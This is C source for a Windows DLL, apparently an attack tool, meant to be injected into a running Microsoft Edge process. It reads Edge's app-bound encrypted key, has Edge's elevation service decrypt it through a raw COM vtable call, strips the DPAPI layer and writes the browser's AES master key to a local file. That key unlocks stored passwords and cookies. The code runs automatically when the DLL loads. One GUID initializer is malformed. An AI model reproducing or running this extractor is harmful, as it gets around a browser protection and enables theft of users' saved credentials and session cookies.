/* Minimal Edge ABE key extractor DLL.
 * Loaded into a real msedge.exe process -> elevation service accepts
 * the caller (process image = signed Edge binary). Reads Local State,
 * calls IElevator::DecryptData on the app-bound key, user-DPAPIs the
 * result, writes the 32-byte AES key as hex to C:\Tools\key_out.txt. */
#include <windows.h>

#define CHK(x) do { if (!(x)) { fail(#x); return; } } while (0)

static void fail(const char *what) {
    FILE *f = fopen("C:\\Tools\\key_out.txt", "w");
    if (f) { fprintf(f, "ERR %s gle=%lu", what, GetLastError()); fclose(f); }
}

static void b64decode(const char *in, int inlen, unsigned char **out, int *outlen) {
    int table[256]; int i, j, v = 0, bits = 0; int len = 0;
    unsigned char *buf;
    for (i = 0; i < 256; i++) table[i] = -1;
    for (i = 0; i < 64; i++) {
        char c = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[i];
        table[(unsigned char)c] = i;
    }
    buf = (unsigned char *)malloc(inlen * 3 / 4 + 4);
    for (i = 0; i < inlen; i++) {
        int c = table[(unsigned char)in[i]];
        if (c < 0) continue;
        v = (v << 6) | c; bits += 6;
        if (bits >= 8) { bits -= 8; buf[len++] = (v >> bits) & 0xFF; }
    }
    *out = buf; *outlen = len;
}

static char *read_file(const char *path, int *len) {
    FILE *f = fopen(path, "rb");
    char *buf; long sz;
    if (!f) return NULL;
    fseek(f, 0, SEEK_END); sz = ftell(f); fseek(f, 0, SEEK_SET);
    buf = (char *)malloc(sz + 1);
    fread(buf, 1, sz, f); buf[sz] = 0; fclose(f);
    if (len) *len = (int)sz;
    return buf;
}

typedef struct { DWORD cbData; BYTE *pbData; } MYBLOB;

static HRESULT (__stdcall *DecryptDataFn)(void *, MYBLOB *, MYBLOB *, DWORD *);

static void do_work(void) {
    /* Edge elevation CLSID + IElevatorEdge IID + IElevator2 IID */
    static const GUID clsid = {0x1FCBE96C,0x1697,0x43AF,{0x91,0x40,0x28,0x97,0xC7,0xC6,0x97,0x67}};
    static const GUID iidEdge = {0xC9C2B807,0x7731,0x4F34,0x81B7,0x44,0xFF,0x77,0x79,0x52,0x2B};
    static const GUID iid2    = {0x8F7B6792,0x784D,0x4047,{0x84,0x5D,0x17,0x82,0xEF,0xBE,0xF2,0x05}};

    char *json; char *k, *e; int jlen, blen; unsigned char *bin = NULL;
    MYBLOB in, out; DWORD err = 0, i;
    void *obj = NULL; HRESULT hr; void **vtbl;
    DATA_BLOB din, dout; FILE *f;
    char hex[80];

    json = read_file("C:\\Users\\admin\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State", &jlen);
    CHK(json);
    k = strstr(json, "app_bound_encrypted_key");
    CHK(k);
    k = strchr(k + 23, '"'); CHK(k);   /* opening quote of value */
    k++; e = strchr(k, '"'); CHK(e);
    b64decode(k, (int)(e - k), &bin, &blen);
    CHK(bin && blen > 8 && memcmp(bin, "APPB", 4) == 0);

    CoInitializeEx(NULL, COINIT_APARTMENTTHREADED);

    in.cbData = blen - 4;
    in.pbData = bin + 4;
    out.cbData = 0; out.pbData = NULL;

    hr = CoCreateInstance(&clsid, NULL, CLSCTX_LOCAL_SERVER, &iidEdge, &obj);
    if (FAILED(hr))
        hr = CoCreateInstance(&clsid, NULL, CLSCTX_LOCAL_SERVER, &iid2, &obj);
    CHK(SUCCEEDED(hr));

    vtbl = *(void ***)obj;
    DecryptDataFn = (void *)vtbl[5];
    hr = DecryptDataFn(obj, &in, &out, &err);
    CHK(SUCCEEDED(hr) && out.cbData > 0);

    /* outer system-DPAPI removed by elevator; strip user-DPAPI layer here */
    din.cbData = out.cbData; din.pbData = out.pbData;
    dout.cbData = 0; dout.pbData = NULL;
    CHK(CryptUnprotectData(&din, NULL, NULL, NULL, NULL, 0, &dout));
    CHK(dout.cbData == 32);

    f = fopen("C:\\Tools\\key_out.txt", "w");
    CHK(f);
    for (i = 0; i < 32; i++) fprintf(f, "%02X", dout.pbData[i]);
    fclose(f);
}

static DWORD WINAPI thread_main(LPVOID p) { (void)p; do_work(); return 0; }

BOOL APIENTRY DllMain(HMODULE h, DWORD reason, LPVOID r) {
    (void)h; (void)r;
    if (reason == DLL_PROCESS_ATTACH)
        DisableThreadLibraryCalls(h),
        CreateThread(NULL, 0, thread_main, NULL, 0, NULL);
    return TRUE;
}

__declspec(dllexport) void __stdcall Bootstrap(LPVOID p) { (void)p; do_work(); }